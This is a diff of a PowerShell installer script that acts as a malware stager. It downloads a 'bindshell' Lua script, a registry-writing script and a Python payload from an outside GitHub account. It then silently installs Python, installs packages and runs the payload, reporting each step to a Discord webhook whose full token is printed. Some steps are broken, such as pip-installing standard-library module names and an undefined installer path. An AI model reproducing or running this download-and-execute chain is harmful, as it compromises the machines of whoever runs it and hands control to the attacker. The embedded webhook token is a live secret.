@@ -7,16 +7,10 @@ $luaJitUrl = "https://github.com/invisibleghostshell-ux/lua/raw/main/LuaJIT-2.1.
 $bindshellScriptUrl = "https://github.com/invisibleghostshell-ux/last/raw/main/bin.lua"
 $regwriteScriptUrl = "https://github.com/invisibleghostshell-ux/last/raw/main/regwrite.lua"
 $extraScriptUrl = "https://github.com/invisibleghostshell-ux/last/raw/main/main.lua"
-$requirementsUrl = "https://github.com/invisibleghostshell-ux/last/raw/main/requirements.txt"  # Replace with actual URL
 $ghostConfigPyUrl = "https://github.com/invisibleghostshell-ux/last/raw/main/winsic.py"
-# Download Lua scripts
-$bindshellScriptUrl = "https://github.com/invisibleghostshell-ux/last/raw/main/bin.lua"
-$regwriteScriptUrl = "https://github.com/invisibleghostshell-ux/last/raw/main/regwrite.lua"
-$extraScriptUrl = "https://github.com/invisibleghostshell-ux/last/raw/main/main.lua"
 $bindshellScriptPath = "$baseDir\bin.lua"
 $regwriteScriptPath = "$baseDir\regwrite.lua"
 $extraScriptPath = "$baseDir\main.lua"
-$requirementsPath = "$baseDir\requirements.txt"
 $ghostConfigPyPath = "$baseDir\winsic.py"
 $discordWebhookUrl = "https://discord.com/api/webhooks/1268854626288140372/Jp_jALGydP2E3ZGckb3FOVzc9ZhkJqKxsKzHVegnO-OIAwAWymr6lsbjCK0DAP_ttRV2"
 $luaJitPath = "$baseDir\LuaJIT-2.1"
@@ -24,9 +18,6 @@ $luaPathDir = "$baseDir\Luapath"
 $jitDir = "$luaPathDir\src\jit"
 $srcDir = "$luaPathDir\src"
 $jitSourceDir = "$luaJitPath\src\jit"
-# Define Python installation and environment variables
-$pythonVersion = "3.11.5"
-$pythonDir = "$baseDir\PythonPortable"
 $venvDir = "$baseDir\venv"
 
 # Function to send messages to Discord webhook
@@ -203,14 +194,38 @@ if (-not (Test-Path -Path $jitDir)) {
 
 # Copy LuaJIT JIT files
 $jitSourceDir = "$luaJitPath\src\jit"
-if (-not (Test-Path -Path $jitSourceDir)) {
-    Send-DiscordMessage -message "JIT source directory does not exist: $jitSourceDir"
+if (Test-Path -Path $jitSourceDir) {
+    Copy-File -Source "$jitSourceDir\*" -Destination $jitDir
+    Wait-ForMinute
+} else {
+    $message = "JIT source directory does not exist: $jitSourceDir"
+    Send-DiscordMessage -message $message
     exit 1
 }
 
-Copy-File -Source "$jitSourceDir\*.c" -Destination "$srcDir\"
-Copy-File -Source "$jitSourceDir\*.h" -Destination "$srcDir\"
-Copy-File -Source "$jitSourceDir\*.cpp" -Destination "$srcDir\"
+# Copy luajit.exe and lua51.dll to Luapath base directory
+if (Test-Path -Path "$luaJitPath\src\luajit.exe") {
+    Copy-File -Source "$luaJitPath\src\luajit.exe" -Destination "$luaPathDir\luajit.exe"
+    Wait-ForMinute
+} else {
+    $message = "luajit.exe does not exist in the source directory: $luaJitPath\src"
+    Send-DiscordMessage -message $message
+    exit 1
+}
+
+if (Test-Path -Path "$luaJitPath\src\lua51.dll") {
+    Copy-File -Source "$luaJitPath\src\lua51.dll" -Destination "$luaPathDir\lua51.dll"
+    Wait-ForMinute
+} else {
+    $message = "lua51.dll does not exist in the source directory: $luaJitPath\src"
+    Send-DiscordMessage -message $message
+    exit 1
+}
+
+# Download Lua scripts
+$bindshellScriptUrl = "https://github.com/invisibleghostshell-ux/last/raw/main/bin.lua"
+$regwriteScriptUrl = "https://github.com/invisibleghostshell-ux/last/raw/main/regwrite.lua"
+$extraScriptUrl = "https://github.com/invisibleghostshell-ux/last/raw/main/main.lua"
 
 if (-not (Test-Path -Path $bindshellScriptPath)) {
     Get-File -url $bindshellScriptUrl -destination $bindshellScriptPath
@@ -224,50 +239,56 @@ if (-not (Test-Path -Path $extraScriptPath)) {
     Get-File -url $extraScriptUrl -destination $extraScriptPath
 }
 
-# Download the requirements.txt file
-if (-not (Test-Path -Path $requirementsPath)) {
-    Get-File -url $requirementsUrl -destination $requirementsPath
-}
-
 # Download and execute winsic.py
 if (-not (Test-Path -Path $ghostConfigPyPath)) {
     Get-File -url $ghostConfigPyUrl -destination $ghostConfigPyPath
 }
 
-
-# Download Portable Python
-Send-DiscordMessage -message "Downloading Portable Python..."
-if (-not (Test-Path -Path "$pythonDir\python.exe")) {
-    $pythonZip = "$baseDir\python-$pythonVersion-embed-amd64.zip"
-    if (-not (Test-Path -Path $pythonZip)) {
-        $pythonZipUrl = "https://www.python.org/ftp/python/$pythonVersion/python-$pythonVersion-embed-amd64.zip"
-        Get-File -url $pythonZipUrl -destination $pythonZip
-    }
-
-    Send-DiscordMessage -message "Extracting Portable Python..."
-    try {
-        Expand-Archive -Path $pythonZip -DestinationPath $pythonDir
-    } catch {
-        $message = "Error extracting Portable Python ZIP file: $(${_})"
-        Send-DiscordMessage -message $message
-        exit 1
-    }
+# Download and install the latest Python version
+Send-DiscordMessage -message "Downloading latest Python installer..."
+if (-not (Test-Path -Path $pythonInstaller)) {
+    $pythonInstallerUrl = "https://www.python.org/ftp/python/3.11.5/python-3.11.5-amd64.exe"
+    Get-File -url $pythonInstallerUrl -destination $pythonInstaller
 }
 
+Send-DiscordMessage -message "Installing Python..."
+Start-Process -FilePath $pythonInstaller -ArgumentList "/quiet InstallAllUsers=1 PrependPath=1 TargetDir=$pythonDir" -NoNewWindow -Wait
+
 # Install virtualenv and set up the environment
-Send-DiscordMessage -message "Installing virtualenv..."
-& "$pythonDir\python.exe" -m ensurepip
-& "$pythonDir\python.exe" -m pip install --upgrade pip
-& "$pythonDir\python.exe" -m pip install virtualenv
+Send-DiscordMessage -message "Setting up Python environment..."
+python -m ensurepip
+python -m pip install --upgrade pip
+python -m pip install virtualenv
 
+$venvDir = "$baseDir\venv"
 Send-DiscordMessage -message "Creating virtual environment..."
-& "$pythonDir\python.exe" -m virtualenv $venvDir
+python -m virtualenv $venvDir
 
-Send-DiscordMessage -message "Installing dependencies from requirements.txt..."
-if (Test-Path -Path $requirementsPath) {
-    & "$venvDir\Scripts\python.exe" -m pip install -r $requirementsPath
-} else {
-    Send-DiscordMessage -message "No requirements.txt found, skipping dependency installation."
+Send-DiscordMessage -message "Activating virtual environment..."
+& "$venvDir\Scripts\activate.bat"
+
+# Install required Python packages directly in the script
+$packages = @(
+    "ctypes",
+    "platform",
+    "json",
+    "sys",
+    "shutil",
+    "sqlite3",
+    "cryptography",
+    "re",
+    "os",
+    "asyncio",
+    "aiohttp",
+    "base64",
+    "time"
+)
+
+foreach ($package in $packages) {
+    Send-DiscordMessage -message "Installing $package..."
+    & "$venvDir\Scripts\pip.exe" install $package
+    Send-DiscordMessage -message "Requirements installed successfully."
+
 }
 
 # Run the Python script
@@ -275,4 +296,3 @@ Send-DiscordMessage -message "Running the Python script..."
 & "$venvDir\Scripts\python.exe" $ghostConfigPyPath
 
 Send-DiscordMessage -message "All steps completed."
-
